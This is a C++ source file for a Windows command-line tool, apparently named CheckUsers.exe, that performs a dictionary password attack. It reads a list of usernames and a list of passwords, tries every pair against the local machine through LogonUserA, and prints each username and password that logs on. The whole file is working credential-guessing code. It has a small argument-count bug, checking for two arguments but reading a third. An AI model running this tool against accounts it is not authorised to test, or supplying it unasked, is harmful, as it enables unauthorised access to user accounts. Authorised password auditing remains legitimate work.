
#include <stdio.h>
#include <iostream>
#include <fstream>
#include <Windows.h>
#include <string>
#include <vector>

#define _CRT_SECURE_NO_WARNINGS
#pragma warning(disable: 4996)

bool CheckCredentials(std::string domain, std::string username, std::string pwd) {
	try
	{
		HANDLE phToken;
		bool status = false;

		status = LogonUserA(username.c_str(), domain.c_str(), pwd.c_str(), LOGON32_LOGON_INTERACTIVE, LOGON32_PROVIDER_DEFAULT, &phToken);

		return status;
	}
	catch (std::exception e)
	{
		return false;
	}
}


int main(int argc, char const *argv[])
{
	std::string domain = getenv("COMPUTERNAME");
	if (argc < 2) {
		printf("Not enough arguments! \n");
		printf("Usage: CheckUsers.exe userlist.txt passwords.txt >> output.txt \n");
		return 0;
	}
	std::vector<std::string> Dictionary;
	try
	{
		std::string PAStxt;
		std::ifstream DL(argv[2]);
		while (getline(DL, PAStxt)) {
			Dictionary.push_back(PAStxt);
		}
		DL.close();
		std::string ULtxt;
		std::ifstream UserList(argv[1]);
		while (getline(UserList, ULtxt)) {
			for (unsigned int i = 0; i < Dictionary.size(); i++)
			{
				if (CheckCredentials(domain, ULtxt, Dictionary[i]))
				{
					printf("User %s has password %s \n", ULtxt.c_str(), Dictionary[i].c_str());
				}
			}
		}
		UserList.close();
	}
	catch (std::exception e)
	{
		printf(" Error reading files! Please check your input!");
		return 0;
	}
}
